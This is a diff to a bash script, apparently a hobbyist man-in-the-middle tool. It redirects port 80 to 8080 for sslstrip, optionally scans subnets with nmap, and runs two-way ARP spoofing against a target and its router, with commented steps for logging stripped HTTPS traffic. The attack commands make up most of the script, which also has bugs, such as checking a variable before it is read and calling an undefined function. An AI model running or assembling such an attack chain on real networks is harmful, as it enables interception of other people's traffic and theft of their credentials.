@@ -6,8 +6,9 @@ echo enabling port forwarding from a certain port to another port
 iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 
 iptables -t nat -L PREROUTING  
 sslstrip -h
-
-
+#Not really sure what this does look into it more 
+iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+iptables -L INPUT 
 
 #stopped at 8:16:68
 echo the default gateway info is listed below
@@ -33,23 +34,39 @@ COUNTER=1
 p=p
 let SUBCNT=SUBCNT+1
 TEMP=0
-while [ $COUNTER -lt $SUBCNT ]; do
-	echo $COUNTER :
-	NMAPADD=$(sed -n 1p gatewayIPsubnet.txt)
-	echo you are about to Nmap $NMAPADD range:
-	nmap $NMAPADD -vv
-	let COUNTER=COUNTER+1
-done
-	
+echo Would you like to NMAP again please enter 'Y' to do it 
+read nmapbit 
+if [ $nmapbit = "Y" ]; then 
+	while [ $COUNTER -lt $SUBCNT ]; do
+		echo $COUNTER :
+		NMAPADD=$(sed -n 1p gatewayIPsubnet.txt)
+		echo you are about to Nmap $NMAPADD range:
+		nmap $NMAPADD -vv
+		let COUNTER=COUNTER+1
+	done
+fi	
 
-sleep 7
+
 
 echo ARP Spoofing attacl
-echo Syntax: arpspoof -i interface -t target-ip target-gateway-ip
-echo Place enter the target-ip 
-#read $targetIP
-echo ""
-echo Please enter the targetGatewayIP
-#read $targetGate
-#arpspoof -i eth0 -t $targetIP $targetGate
+echo Syntax: arpspoof -i interface -t target-ip -r target-gateway-ip
+echo Place enter the router ip address or default gateway 
+read -p "default router IP: " targetDefault
+if [ ! -z "${targetIP}" ]&&[ ! -z "${targetDefault}"]
+then
+	echo -e "t${targetIP}\t${targetDefault}" >> ipadds.txt
+else
+	input
+fi
+echo Please enter the targetIP of System
+read -p "target IP: "  targetIP
+arpspoof -i eth0 -t $targetDefault -r $targetIP &
+routerPID=$!
+arpspoof -i eth0 -t $targetIP -r $targetDefault
+sleep 180 
+kill -TERM $routerPID
+#sslstrip 8080
+#cp sslstrip.log targethttpStripLog.txt
+#tail -f sslstrip.log
+
 
